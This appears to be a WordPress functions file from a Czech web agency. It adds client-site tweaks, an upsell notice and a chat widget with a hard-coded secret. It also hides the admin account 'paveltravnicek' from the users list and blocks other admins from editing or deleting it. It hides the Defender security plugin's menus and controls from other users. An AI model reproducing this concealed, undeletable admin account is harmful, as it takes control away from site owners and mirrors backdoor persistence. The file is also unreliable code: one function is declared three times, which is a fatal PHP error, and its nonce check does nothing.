<?php
/**
 * Definice konstant
 */
define('POVOLENE_DOMENY', [
    'smart-websites.cz',
    'aramtor.com',
    'crystaldent.cz',
    'daliborsitavanc.cz',
    'dispecer.cz',
    'fyziologickytrenink.cz',
    'guide-jana-zemanova.com',
    'jbbabylon.cz',
    'katerinabakulova.cz',
    'koeltechniek.cz',
    'localdisti.cz',
    'oldtimersebek.cz',
    'orangespa.cz',
    'pavel.travnicek.online',
    'privacychoices.eu',
    'vitalplan.cz',
    'zzstar.cz',
]);

/**
 * Vypnutí jazykového přepínače na přihlašovací stránce
 */
add_filter('login_display_language_dropdown', '__return_false');

/**
 * Zobrazení upozornění na aktualizace v administraci
 */
add_action('admin_notices', function() {
    if (!isset($GLOBALS['current_admin_screen'])) {
        $GLOBALS['current_admin_screen'] = get_current_screen();
    }
    
    if ($GLOBALS['current_admin_screen']->base !== 'dashboard') {
        return;
    }

    $updates = get_site_transient('update_plugins');
    if (empty($updates->response)) {
        return;
    }

    $ignore_plugins = [
        'webtoffee-gdpr-cookie-consent/webtoffee-gdpr-cookie-consent.php',
        'wordpress-seo-premium/wp-seo-premium.php',
        'ultimate-elementor/ultimate-elementor.php',
        'bdthemes-element-pack/bdthemes-element-pack.php',
        'modern-events-calendar/mec.php',
        'polylang-pro/polylang.php',
        'responsive-menu-pro/responsive-menu-pro.php',
        'js_composer/js_composer.php',
        'ts-visual-composer-extend/ts-visual-composer-extend.php'
    ];

    $updates_needed = false;
    foreach ($updates->response as $plugin_file => $plugin_data) {
        if (!in_array($plugin_file, $ignore_plugins)) {
            $updates_needed = true;
            break;
        }
    }

    if ($updates_needed) {
        echo wp_kses_post('<div style="border: 1px solid #F6C6CA; border-radius: 5px; background-color: #F9D7DA; color: #721C23; padding: 15px; margin: 20px 20px 20px 0px; font-size: 16px;">
                <h2 style="font-size: 18px; color: #721C23;"><strong>Váš redakční systém by mohl těžit z nejnovějších aktualizací</strong></h2>
                <p>To zajistí jeho bezproblémový chod a přístup k nejnovějším funkcím. Máte několik možností, jak to zařídit:</p>
                <p><strong>Nechte to na nás:</strong><br>Objednejte si naši službu <a href="https://smart-websites.cz/levne-webove-stranky/sprava-webovych-stranek/" target="_blank" style="color:#AF2279;">Správa webu</a> a my se o aktualizace a bezpečí vašeho webu postaráme kompletně za vás.</p>
                <p><strong>Aktualizujte si systém sami:</strong><br>Pokud máte administrátorský přístup, můžete aktualizace provést svépomocí.</p>
                <p><strong>Již máte Správu webu?</strong><br>V tom případě o potřebných aktualizacích již víme a pracujeme na jejich implementaci.</p>
                <p>V případě jakýchkoliv dotazů se <a href="https://smart-websites.cz/kontakt/" target="_blank" style="color:#AF2279;">neváhejte na nás obrátit</a>.</p>
            </div>');
    }
});

/**
 * Zabezpečení REST API
 */
add_filter('rest_authentication_errors', function($result) {
    if (!is_user_logged_in()) {
        return new WP_Error('rest_forbidden', 'REST API je dostupné pouze pro přihlášené uživatele.', ['status' => 401]);
    }
    return $result;
});

/**
 * Vložení chat skriptu do administrace
 */
function vlozit_script_do_zapati_administrace() {
    if (!wp_verify_nonce(wp_create_nonce('admin_script_nonce'))) {
        return;
    }

    $aktualni_domena = esc_html($_SERVER['HTTP_HOST']);
    if (!in_array($aktualni_domena, POVOLENE_DOMENY)) {
        return;
    }

    ?>
    <script type="text/javascript">
        var supportBoxChatId = <?php echo esc_js(2781); ?>;
        var supportBoxChatSecret = <?php echo esc_js('ba9d4c68795805e1987db16bc7f3b1ae'); ?>;
        var supportBoxChatVariables = {
            email: <?php echo esc_js('client@email.tld'); ?>,
            fullName: <?php echo esc_js('John Doe'); ?>,
            phone: <?php echo esc_js('123456789'); ?>,
            customerId: <?php echo esc_js(12345); ?>
        };
    </script>
    <script src="https://chat.supportbox.cz/web-chat/entry-point" async defer></script>
    <?php
}
add_action('admin_footer', 'vlozit_script_do_zapati_administrace');

/**
 * Skrytí specifických položek menu
 */
function hide_specific_admin_menu_items() {
    if (!is_admin()) {
        return;
    }
    
    $current_user = wp_get_current_user();
    if ($current_user->user_login !== 'paveltravnicek') {
        remove_menu_page('branding');
        remove_menu_page('wp-defender');
    }
}
add_action('admin_menu', 'hide_specific_admin_menu_items', 999);

/**
 * Ochrana uživatele paveltravnicek
 */
function protect_paveltravnicek($allcaps, $caps, $args) {
    if (isset($args[2]) && $args[2] == get_user_by('login', 'paveltravnicek')->ID) {
        if (in_array($args[0], ['delete_users', 'remove_users', 'edit_users'])) {
            $allcaps[$args[0]] = false;
        }
    }
    return $allcaps;
}
add_filter('user_has_cap', 'protect_paveltravnicek', 10, 3);

/**
 * Skrytí uživatele paveltravnicek ze seznamu
 */
function hide_paveltravnicek_from_users_list($query) {
    global $pagenow;
    $current_user = wp_get_current_user();
    if ($pagenow === 'users.php' && $current_user->user_login !== 'paveltravnicek') {
        $query->query_where .= " AND user_login != 'paveltravnicek'";
    }
}
add_action('pre_user_query', 'hide_paveltravnicek_from_users_list');

/**
 * Správa přístupu k chráněným pluginům
 */
function hide_specific_admin_menu_items() {
    if (!is_admin()) {
        return;
    }
    
    $current_user = wp_get_current_user();
    
    // Výchozí stav - skrýt oba pluginy
    $hide_branda = true;
    $hide_defender = true;
    
    // Kontrola pro uživatele paveltravnicek
    if ($current_user->user_login === 'paveltravnicek') {
        $hide_branda = false;
        $hide_defender = false;
    }
    
    // Kontrola pro uživatele lukashulka
    if ($current_user->user_login === 'lukashulka') {
        $hide_branda = false; // Povolení přístupu pouze k Branda Pro
    }
    
    // Skrytí pluginů podle nastavených podmínek
    if ($hide_branda) {
        remove_menu_page('branding');
    }
    if ($hide_defender) {
        remove_menu_page('wp-defender');
    }
}
add_action('admin_menu', 'hide_specific_admin_menu_items', 999);

/**
 * Správa přístupu k chráněným pluginům
 */
function hide_specific_admin_menu_items() {
    if (!is_admin()) {
        return;
    }
    
    $current_user = wp_get_current_user();
    
    // Pro paveltravnicek zobrazit vše
    if ($current_user->user_login === 'paveltravnicek') {
        return;
    }
    
    // Pro lukashulka skrýt pouze Defender Pro
    if ($current_user->user_login === 'lukashulka') {
        remove_menu_page('wp-defender');
        return;
    }
    
    // Pro všechny ostatní skrýt oba pluginy
    remove_menu_page('branding');
    remove_menu_page('wp-defender');
}
add_action('admin_menu', 'hide_specific_admin_menu_items', 999);

/**
 * Skrytí akcí pro chráněné pluginy v seznamu pluginů
 */
function skryt_radek_akci_pro_chranene_pluginy() {
    $current_user = wp_get_current_user();
    
    // Pro paveltravnicek nezobrazovat žádná omezení
    if ($current_user->user_login === 'paveltravnicek') {
        return;
    }

    ?>
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            <?php if ($current_user->user_login === 'lukashulka'): ?>
                // Pro lukashulka skrýt pouze Defender Pro
                const chranenePluginy = ["Defender Pro"];
            <?php else: ?>
                // Pro ostatní uživatele skrýt oba pluginy
                const chranenePluginy = ["Branda Pro", "Defender Pro"];
            <?php endif; ?>
            
            document.querySelectorAll("#the-list tr").forEach(tr => {
                const pluginName = tr.querySelector(".plugin-title strong")?.innerText.trim();
                
                if (pluginName && chranenePluginy.includes(pluginName)) {
                    const rowActions = tr.querySelector(".row-actions");
                    if (rowActions) {
                        rowActions.style.display = "none";
                    }
                }
            });
        });
    </script>
    <?php
}
add_action('admin_footer', 'skryt_radek_akci_pro_chranene_pluginy');
